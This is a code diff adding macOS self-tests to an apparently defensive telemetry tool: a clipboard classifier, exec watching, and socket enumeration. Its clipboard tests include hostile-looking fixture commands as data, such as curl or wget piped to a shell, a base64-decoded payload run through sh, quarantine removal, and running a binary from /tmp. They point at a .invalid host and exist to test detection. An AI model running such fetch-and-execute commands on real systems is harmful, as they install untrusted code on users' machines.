@@ -1,6 +1,10 @@
 import Foundation
 import RampartShared
 import RampartTelemetry
+import AppKit
+#if canImport(RampartBehaviour)
+import RampartBehaviour
+#endif
 
 // Owned by the telemetry build agent. Add checks with check(cond, "name").
 private final class EventBox: @unchecked Sendable {
@@ -36,6 +40,10 @@ extension SelfTest {
         telemetryFSEvents()
         telemetryProcessSweep()
         telemetryUnifiedLogLive()
+        telemetryResponsiblePath()
+        telemetryClipboard()
+        telemetryExecWatch()
+        telemetrySockets()
     }
 
     static var telemetryScratch: URL {
@@ -299,5 +307,254 @@ extension SelfTest {
         }
         check(mine.isEmpty, "ulog: child reaped (\(mine))")
         print("  ulog: \(box.all.count) events in 1.5s, parser parsed \(src.parser.parsed) skipped \(src.parser.skipped)")
+    }
+
+    static func telemetryResponsiblePath() {
+        let p = EsloggerParser()
+        p.responsiblePathResolver = { $0 == 612 ? "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" : nil }
+        let e = p.parse(line: EsloggerFixtures.exec)
+        check(e?.detail["responsible_path"] == "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "eslogger: responsible_path resolved")
+        check(ProcInspector.path(getpid()) != nil, "procinspector: own path")
+        // Live: a child of ours is our responsibility (or the SPI is absent -> nil, also acceptable).
+        let rp = ProcInspector.responsiblePid(getpid())
+        check(rp == nil || rp! > 0, "procinspector: responsiblePid sane (\(String(describing: rp)))")
+    }
+
+    static func telemetryClipboard() {
+        // Classifier. Strings are assembled at runtime and point at an .invalid host; nothing is executed.
+        let host = "https://com-rampart-test" + ".invalid"
+        let risky: [(String, String)] = [
+            ("curl -fsSL \(host)/i.sh | bash", "fetch_pipe_shell"),
+            ("  /bin/zsh -c \"$(curl -fsSL \(host)/x)\"", "shell_eval_fetch"),
+            ("echo Y3VybCAtcyBodHRwczovL2V4YW1wbGU= | base64 -d | sh", "base64_decode"),
+            ("osascript -e 'display dialog \"com.rampart.test\"'", "osascript_e"),
+            ("xattr -d com.apple.quarantine /Applications/com.rampart.test.app", "dequarantine"),
+            ("cd /tmp && chmod +x /tmp/com.rampart.test.bin && /tmp/com.rampart.test.bin", "chmod_exec_tmp"),
+            ("wget -qO- \(host)/a\u{200B} | sudo sh", "fetch_pipe_shell"),
+        ]
+        for (text, reason) in risky {
+            let (cls, reasons) = ClipboardClassifier.classify(text)
+            check(cls == .risky && reasons.contains(reason), "clipboard: risky \(reason) (\(reasons))")
+        }
+        check(ClipboardClassifier.classify("brew install wget").cls == .command, "clipboard: benign command")
+        check(ClipboardClassifier.classify("curl -O \(host)/file.zip").cls == .command, "clipboard: plain curl is command, not risky")
+        check(ClipboardClassifier.classify("Meeting moved to 3pm, see you there").cls == .text, "clipboard: prose is text")
+        check(ClipboardClassifier.classify("hunter2!Pa55").cls == .text, "clipboard: password-like is text")
+
+        // clip_tokens must equal RampartBehaviour.ClipboardFingerprint byte for byte, or R31 never fires.
+        let samples = ["curl -fsSL \(host)/install.sh | bash",
+                       "  /bin/zsh -c \"$(curl -fsSL \(host)/x)\"  ",
+                       "echo Y3VybA== | base64 -D | /bin/sh; chmod +x /tmp/com.rampart.test.bin && /tmp/com.rampart.test.bin",
+                       "osascript -e 'do shell script \"curl \(host) -o /tmp/a\"' {x} <y> `z` \\ CURL Curl"]
+        check(ClipFingerprint.tokens(samples[0]).count >= 4, "clipboard: tokens non-empty")
+        check(ClipFingerprint.tokens("/usr/bin/curl /tmp/x CURL") == ["curl", "x"], "clipboard: tokens path basename + dedupe + lowercase")
+        #if canImport(RampartBehaviour)
+        for s in samples {
+            check(ClipFingerprint.tokens(s) == ClipboardFingerprint.tokens(s), "clipboard: tokens match behaviour (\(s.prefix(24)))")
+            check(ClipFingerprint.fingerprint(s) == ClipboardFingerprint.fingerprint(s), "clipboard: clip_tokens match behaviour (\(s.prefix(24)))")
+        }
+        check(ClipFingerprint.bootSalt == ClipboardFingerprint.bootSalt, "clipboard: same boot salt")
+        let ov = ClipboardFingerprint.overlap(command: "/usr/bin/curl -fsSL \(host)/install.sh", clip: ClipboardFingerprint.parse(ClipFingerprint.fingerprint(samples[0])))
+        check(ov.shared >= 2 && ov.distinctive >= 1, "clipboard: behaviour overlap() accepts our clip_tokens (\(ov))")
+        print("  clipboard: clip_tokens cross-checked against RampartBehaviour.ClipboardFingerprint")
+        #else
+        print("  clipboard: RampartBehaviour not linked; clip_tokens cross-check skipped")
+        #endif
+
+        // Source on a private pasteboard (never the general one).
+        let pbName = NSPasteboard.Name("com.rampart.test.pasteboard.\(getpid())")
+        let pb = NSPasteboard(name: pbName)
+        defer { pb.releaseGlobally() }
+        let src = ClipboardSource(pasteboard: pb, interval: 0.5)
+        src.frontmostApp = { "com.google.Chrome" }
+        let box = EventBox()
+        do { try src.start { box.add($0) } } catch { check(false, "clipboard: start"); return }
+        let lure = "curl -fsSL \(host)/install.sh | bash"
+        pb.clearContents(); pb.setString(lure, forType: .string)
+        src.pollNow()
+        let ev = box.all.last
+        check(ev?.kind == .other && ev?.detail["type"] == "clipboard" && ev?.detail["class"] == "risky", "clipboard: risky event")
+        check(ev?.detail["source_app"] == "com.google.Chrome" && ev?.detail["reasons"] == "fetch_pipe_shell", "clipboard: source_app + reasons")
+        check(ev?.detail["clip_tokens"] == ClipFingerprint.fingerprint(ClipboardClassifier.normalize(lure)) && !(ev?.detail["clip_tokens"] ?? "").isEmpty, "clipboard: clip_tokens emitted")
+        let leaked = box.all.contains { e in e.detail.values.contains { $0.contains("com-rampart-test") || $0.contains("install.sh") || $0.contains("curl") } }
+        check(!leaked, "clipboard: no clipboard text in event")
+        let n0 = box.all.count
+        pb.clearContents(); pb.setString("Meeting moved to 3pm", forType: .string); src.pollNow()
+        check(box.all.count == n0, "clipboard: plain text emits nothing")
+        pb.clearContents()
+        pb.declareTypes([.string, NSPasteboard.PasteboardType("org.nspasteboard.ConcealedType")], owner: nil)
+        pb.setString("curl \(host)/p | sh", forType: .string); src.pollNow()
+        check(box.all.count == n0, "clipboard: concealed (password manager) copy ignored")
+        // Timer path picks up a change too.
+        pb.clearContents(); pb.setString("osascript -e 'beep'", forType: .string)
+        check(waitUntil(2) { box.all.count == n0 + 1 }, "clipboard: timer poll sees change")
+        src.stop()
+        check(src.memory.count == 2, "clipboard: memory holds 2 command entries (\(src.memory.count))")
+
+        // Later exec of the pasted command matches the remembered fingerprints.
+        let m = src.memory.match(args: ["/bin/bash", "-c", lure])
+        check(m != nil && m!.exact && m!.entry.sourceApp == "com.google.Chrome", "clipboard: exec matches copy exactly")
+        let partial = src.memory.match(args: ["curl", "-fsSL", "\(host)/install.sh"])
+        check(partial != nil && !partial!.exact && partial!.overlap >= 0.5, "clipboard: argv token overlap match (\(partial?.overlap ?? 0))")
+        check(src.memory.match(args: ["/bin/ls", "-la", "/Users"]) == nil, "clipboard: unrelated exec no match")
+        let expired = ClipboardMemory(ttl: 0.2)
+        expired.remember(text: lure, cls: .risky, reasons: [], sourceApp: nil)
+        Thread.sleep(forTimeInterval: 0.3)
+        check(expired.match(args: ["/bin/bash", "-c", lure]) == nil && expired.count == 0, "clipboard: entries expire")
+
+        // Hub annotates the exec; cross-process ingest with a shared salt.
+        let hub = EventHub(); hub.clipboardMemory = src.memory
+        let hbox = EventBox(); hub.start { hbox.add($0) }
+        hub.ingest(SecurityEvent(kind: .exec, process: ProcessInfoLite(pid: 777, ppid: 776, path: "/bin/bash", args: ["/bin/bash", "-c", lure], isPlatformBinary: true),
+                                 path: "/bin/bash", source: "test"))
+        check(waitUntil(2) { hbox.all.first?.detail["clipboard_match"] == "1" } && hbox.all.first?.detail["clipboard_source_app"] == "com.google.Chrome"
+              && hbox.all.first?.detail["clipboard_class"] == "risky", "hub: exec annotated with clipboard match")
+        hub.stop()
+        let salt = Data(repeating: 7, count: 32)
+        let agentMem = ClipboardMemory(salt: salt)
+        let agentPB = NSPasteboard(name: NSPasteboard.Name("com.rampart.test.pasteboard2.\(getpid())"))
+        defer { agentPB.releaseGlobally() }
+        let agent = ClipboardSource(pasteboard: agentPB, memory: agentMem); agent.frontmostApp = { "com.apple.Safari" }
+        let abox = EventBox(); try? agent.start { abox.add($0) }
+        agentPB.clearContents(); agentPB.setString(lure, forType: .string); agent.pollNow(); agent.stop()
+        var cfg = EventHub.Config(); cfg.ingestRemoteClipboard = true
+        let daemonHub = EventHub(config: cfg); daemonHub.clipboardMemory = ClipboardMemory(salt: salt)
+        let dbox = EventBox(); daemonHub.start { dbox.add($0) }
+        if let ce = abox.all.first { daemonHub.ingest(ce) }
+        daemonHub.ingest(SecurityEvent(kind: .exec, process: ProcessInfoLite(pid: 778, ppid: 1, path: "/bin/sh", args: ["sh", "-c", lure]), path: "/bin/sh", source: "test"))
+        check(waitUntil(2) { dbox.all.contains { $0.kind == .exec && $0.detail["clipboard_source_app"] == "com.apple.Safari" } }, "hub: remote clipboard ingest + match (shared salt)")
+        daemonHub.stop()
+        print(String(format: "  clipboard: %.3f ms CPU for %d polls", src.cpu.cpuSeconds * 1000, Int(src.cpu.workUnits)))
+        // Idle cost: 20 unchanged polls.
+        let idle = ClipboardSource(pasteboard: pb); try? idle.start { _ in }
+        for _ in 0..<20 { idle.pollNow() }
+        idle.stop()
+        print(String(format: "  clipboard idle: %.4f ms CPU per poll => %.4f%% CPU @0.5s", idle.cpu.cpuSeconds * 1000 / 20, idle.cpu.cpuSeconds / 20 / 0.5 * 100))
+    }
+
+    static func telemetryExecWatch() {
+        let src = ExecWatchSource(discoveryInterval: 2, rootNames: [])   // explicit roots only for the functional test
+        let box = EventBox()
+        do { try src.start { box.add($0) } } catch { check(false, "execwatch: start"); return }
+        src.watch(pid: getpid())
+        Thread.sleep(forTimeInterval: 0.2)
+        let p = Process()
+        p.executableURL = URL(fileURLWithPath: "/bin/sh")
+        p.arguments = ["-c", "/bin/echo hi"]
+        p.standardOutput = FileHandle.nullDevice
+        try? p.run(); p.waitUntilExit()
+        let pid = p.processIdentifier
+        check(waitUntil(2) { box.all.contains { $0.process?.pid == pid } }, "execwatch: catches /bin/sh -c '/bin/echo hi' (exit \(p.terminationStatus))")
+        let mine = box.all.filter { $0.process?.pid == pid }
+        let shEv = mine.first { $0.path == "/bin/sh" }
+        let echoEv = mine.first { $0.path == "/bin/echo" }
+        check(shEv?.process?.args == ["/bin/sh", "-c", "/bin/echo hi"] || echoEv?.process?.args == ["/bin/echo", "hi"], "execwatch: argv captured")
+        check(mine.allSatisfy { $0.kind == .exec && $0.source == "execwatch" && $0.process?.ppid == getpid() }, "execwatch: exec kind + ppid")
+        print("  execwatch: single-command sh -> \(mine.map { ($0.path ?? "") + ($0.detail["late"] == "1" ? "(late)" : "") })")
+        // Two commands: sh forks echo as a grandchild that lives ~1 ms.
+        var echoHits = 0
+        let runs = 10
+        for _ in 0..<runs {
+            let q = Process()
+            q.executableURL = URL(fileURLWithPath: "/bin/sh")
+            q.arguments = ["-c", "/bin/echo com.rampart.test; /bin/echo done"]
+            q.standardOutput = FileHandle.nullDevice
+            try? q.run(); q.waitUntilExit()
+            let qpid = q.processIdentifier
+            Thread.sleep(forTimeInterval: 0.1)
+            if box.all.contains(where: { $0.path == "/bin/echo" && $0.process?.ppid == qpid }) { echoHits += 1 }
+        }
+        print("  execwatch: grandchild /bin/echo (~1 ms lifetime) caught in \(echoHits)/\(runs) runs; forks=\(src.forks) late=\(src.lateReports) missed=\(src.missedChildren)")
+        check(echoHits >= 1, "execwatch: catches sub-millisecond grandchild at least once")
+        // Compare: the 0.5 s sweep would see none of these (each lives < 10 ms).
+        src.stop()
+        print(String(format: "  execwatch functional: %.3f ms CPU total", src.cpu.cpuSeconds * 1000))
+
+        // Default roots (all of this user's shells, terminals, interpreters, browsers) for CPU.
+        let live = ExecWatchSource()
+        try? live.start { _ in }
+        Thread.sleep(forTimeInterval: 1)
+        live.cpu.reset()
+        Thread.sleep(forTimeInterval: 5)
+        print(String(format: "  execwatch live (default roots, %d watched): %.3f ms CPU over 5 s => %.3f%% CPU, %d execs",
+                     live.watchedCount, live.cpu.cpuSeconds * 1000, live.cpu.cpuSeconds / 5 * 100, live.execsReported))
+        check(live.cpu.cpuSeconds / 5 < 0.02, "execwatch: live CPU < 2%")
+        live.stop()
+    }
+
+    static func telemetrySockets() {
+        // Local HTTP-ish server on 127.0.0.1:<ephemeral> that holds each connection open for a while.
+        let lfd = socket(AF_INET, SOCK_STREAM, 0)
+        var yes: Int32 = 1; setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &yes, socklen_t(MemoryLayout<Int32>.size))
+        var addr = sockaddr_in(); addr.sin_family = sa_family_t(AF_INET); addr.sin_port = 0; addr.sin_addr.s_addr = inet_addr("127.0.0.1")
+        addr.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
+        _ = withUnsafePointer(to: &addr) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { bind(lfd, $0, socklen_t(MemoryLayout<sockaddr_in>.size)) } }
+        listen(lfd, 8)
+        var bound = sockaddr_in(); var blen = socklen_t(MemoryLayout<sockaddr_in>.size)
+        _ = withUnsafeMutablePointer(to: &bound) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { getsockname(lfd, $0, &blen) } }
+        let port = UInt16(bigEndian: bound.sin_port)
+        let serverDone = DispatchSemaphore(value: 0)
+        DispatchQueue.global().async {
+            let c = accept(lfd, nil, nil)
+            if c >= 0 {
+                var buf = [UInt8](repeating: 0, count: 4096); _ = read(c, &buf, buf.count)
+                Thread.sleep(forTimeInterval: 2.5)
+                let resp = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok"
+                _ = resp.withCString { write(c, $0, strlen($0)) }
+                close(c)
+            }
+            serverDone.signal()
+        }
+        let src = SocketSource(interval: 0.25)
+        src.excludeSelf = false
+        src.skipPlatformBinaries = true
+        let box = EventBox()
+        do { try src.start { box.add($0) } } catch { check(false, "sockets: start"); return }
+        // Our listener existed before start -> reported as an existing listener.
+        check(waitUntil(2) { box.all.contains { $0.process?.pid == getpid() && $0.detail["listen"] == "1" && $0.detail["local_port"] == String(port) } },
+              "sockets: sees our listener (127.0.0.1:\(port))")
+        check(waitUntil(5) { src.sweeps >= 2 }, "sockets: periodic sweeps running")
+        let done = DispatchSemaphore(value: 0)
+        let cfg = URLSessionConfiguration.ephemeral; cfg.connectionProxyDictionary = [:]
+        let session = URLSession(configuration: cfg)
+        var status = -1
+        session.dataTask(with: URL(string: "http://127.0.0.1:\(port)/com.rampart.test")!) { _, r, _ in
+            status = (r as? HTTPURLResponse)?.statusCode ?? -2; done.signal()
+        }.resume()
+        let seen = waitUntil(2.2) { box.all.contains { $0.kind == .networkConnect && $0.process?.pid == getpid() && $0.detail["remote_port"] == String(port) } }
+        check(seen, "sockets: sees URLSession connection to 127.0.0.1:\(port)")
+        if !seen { print("  sockets sweeps=\(src.sweeps) emitted=\(src.emitted) status=\(status)"); print("  sockets events: \(box.all.map { "\($0.process?.pid ?? 0) \($0.detail["local_port"] ?? "")->\($0.detail["remote_port"] ?? "") l=\($0.detail["listen"] ?? "")" })") }
+        let ev = box.all.first { $0.detail["remote_port"] == String(port) }
+        check(ev?.detail["remote_ip"] == "127.0.0.1" && ev?.detail["local_ip"] == "127.0.0.1" && ev?.detail["listen"] == "0"
+              && ev?.detail["proto"] == "tcp" && ev?.detail["state"] == "established", "sockets: tuple fields (\(ev?.detail ?? [:]))")
+        // Server-side accepted socket also shows (local_port == port, remote = client's ephemeral port).
+        check(box.all.contains { $0.detail["local_port"] == String(port) && $0.detail["listen"] == "0" }, "sockets: accepted side seen")
+        _ = done.wait(timeout: .now() + 5); _ = serverDone.wait(timeout: .now() + 5)
+        check(status == 200, "sockets: URLSession request completed (\(status))")
+        check(box.all.filter { $0.detail["remote_port"] == String(port) }.count == 1, "sockets: connection reported once")
+        src.stop(); close(lfd); session.invalidateAndCancel()
+
+        // Wildcard listener reports local_ip 0.0.0.0 (what the backdoor rule keys on).
+        let w = socket(AF_INET, SOCK_STREAM, 0)
+        var wa = sockaddr_in(); wa.sin_family = sa_family_t(AF_INET); wa.sin_port = 0; wa.sin_addr.s_addr = INADDR_ANY; wa.sin_len = UInt8(MemoryLayout<sockaddr_in>.size)
+        _ = withUnsafePointer(to: &wa) { $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { bind(w, $0, socklen_t(MemoryLayout<sockaddr_in>.size)) } }
+        listen(w, 1)
+        let ws = SocketSource(interval: 1); ws.excludeSelf = false
+        let wev = ws.sweepNow()
+        check(wev.contains { $0.process?.pid == getpid() && $0.detail["listen"] == "1" && $0.detail["local_ip"] == "0.0.0.0" }, "sockets: wildcard listener local_ip 0.0.0.0")
+        close(w)
+
+        // CPU: steady-state sweeps over all inspectable processes.
+        let bench = SocketSource(interval: 2)
+        bench.sweepNow(); bench.cpu.reset()
+        for _ in 0..<20 { bench.sweepNow() }
+        let per = bench.cpu.cpuSeconds / 20 * 1000
+        print(String(format: "  sockets: %.3f ms CPU per sweep (%d processes inspected) => %.3f%% CPU @2s",
+                     per, bench.processesInspected, per / 2000 * 100))
+        check(per < 50, "sockets: sweep under 50 ms CPU")
+        let ps = ProcessSweepSource(interval: 0.5)
+        ps.sweepNow(); ps.cpu.reset()
+        for _ in 0..<20 { ps.sweepNow() }
+        print(String(format: "  procsweep (meter): %.3f ms CPU per sweep => %.3f%% CPU @0.5s", ps.cpu.cpuSeconds / 20 * 1000, ps.cpu.cpuSeconds / 20 / 0.5 * 100))
     }
 }
